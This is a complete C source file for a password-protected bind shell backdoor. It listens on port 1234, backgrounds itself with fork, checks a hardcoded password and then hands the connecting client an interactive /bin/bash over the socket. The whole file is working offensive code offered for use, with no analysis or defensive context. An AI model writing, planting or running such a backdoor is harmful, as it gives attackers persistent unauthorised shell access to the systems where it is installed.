/*
 *
 *
 * BIND SHELL
 *
 * _______
 * |\- -/|
 * |/- -\|
 * | |\ \
 * | | \ \
 * |_|  \_\  
 * 
 *
 *
 * */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//Listening port
#define PORT 1234
//Shellcode password
#define PASSWD "ciao1234"
#define PASSWD_LENGTH 8

int main(int argc,char *argv[]){
	//Descriptors
	int sockfd,new_sockfd,yes=1;
	//Recv Buffer
	char buffer[1024];
	//Addresses
	struct sockaddr_in host_addr,client_addr;
	//Socket length
	socklen_t sin_size;

	if((sockfd = socket(PF_INET,SOCK_STREAM,0)) == -1)
		perror("In socket()");
	if(setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&yes,sizeof(yes)) == -1)
		perror("In setsocketopt()");
	
	//Make host sockaddr
	host_addr.sin_family = AF_INET;
	host_addr.sin_port   = htons(PORT);
	host_addr.sin_addr.s_addr = 0;
	memset(&(host_addr.sin_zero),'\0',8);

	//Bind socket
	if(bind(sockfd,(struct sockaddr *)&host_addr,sizeof(struct sockaddr)) == -1)
		perror("In bind()");
	//Listening to socket
	if(listen(sockfd,3) == -1)
		perror("In listen()");
	sin_size = sizeof(struct sockaddr_in);
	//Background process
	printf("Fork() backgrounding process ...\n");
	if(fork() == 0){
		while(1){
			new_sockfd = accept(sockfd,(struct sockaddr *)&client_addr,&sin_size);
			if(new_sockfd == -1)
				perror("In accept() ");
			send(new_sockfd,"Hi. This is your way.Enter your password :\n",42,0);
			recv(new_sockfd,&buffer,1024,0);
			if(strncmp(PASSWD,buffer,PASSWD_LENGTH) == 0){
				if(fork() == 0){
					send(new_sockfd,"Access granted\n",14,0);
					dup2(new_sockfd,2);
					dup2(new_sockfd,1);
					dup2(new_sockfd,0);
					execl("/bin/bash","bash",NULL);
					return(0);
				}
			}
			else{
				send(new_sockfd,"The password don't match\n",24,0);
			}
		}
	//End of Background process
	return(0);
	}
	close(sockfd);
	close(new_sockfd);
	return(0);

}
